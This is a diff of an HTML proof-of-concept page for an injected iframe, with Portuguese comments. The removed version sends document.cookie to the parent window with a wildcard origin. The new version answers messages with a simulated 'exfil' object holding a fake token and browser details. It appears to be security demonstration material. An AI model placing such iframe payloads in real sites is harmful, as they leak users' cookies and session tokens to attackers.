@@ -1,24 +1,46 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>Injected Iframe</title>
-    <style>
-      body {
-        margin: 0;
-        font-family: sans-serif;
-        background: #111;
-        color: white;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        height: 100vh;
-      }
-    </style>
-  </head>
-  <body>
-    <h1>Iframe Injectado</h1>
-    <script>
-      parent.postMessage(document.cookie, '*');
-    </script>
-  </body>
+<head>
+  <title>PoC PostMessage</title>
+  <style>
+    body {
+      background: black;
+      color: lime;
+      font-family: monospace;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      height: 100vh;
+    }
+  </style>
+</head>
+<body>
+  <h1>Iframe Injectado</h1>
+  <p id="status">Aguardando mensagens...</p>
+
+  <script>
+    // Envia mensagem inicial para a página pai
+    parent.postMessage("[iframe] Pronto para receber comandos", "*");
+
+    // Escuta mensagens da página pai
+    window.addEventListener("message", (event) => {
+      const el = document.getElementById("status");
+      el.innerText = "Mensagem recebida do pai: " + JSON.stringify(event.data);
+
+      // Responde com dados simulados
+      const fakeData = {
+        tipo: "exfil",
+        token: "FAKE-AAD-TOKEN-XYZ",
+        info: {
+          userAgent: navigator.userAgent,
+          lang: navigator.language,
+          timestamp: new Date().toISOString()
+        }
+      };
+
+      event.source.postMessage(fakeData, event.origin);
+    });
+  </script>
+</body>
 </html>
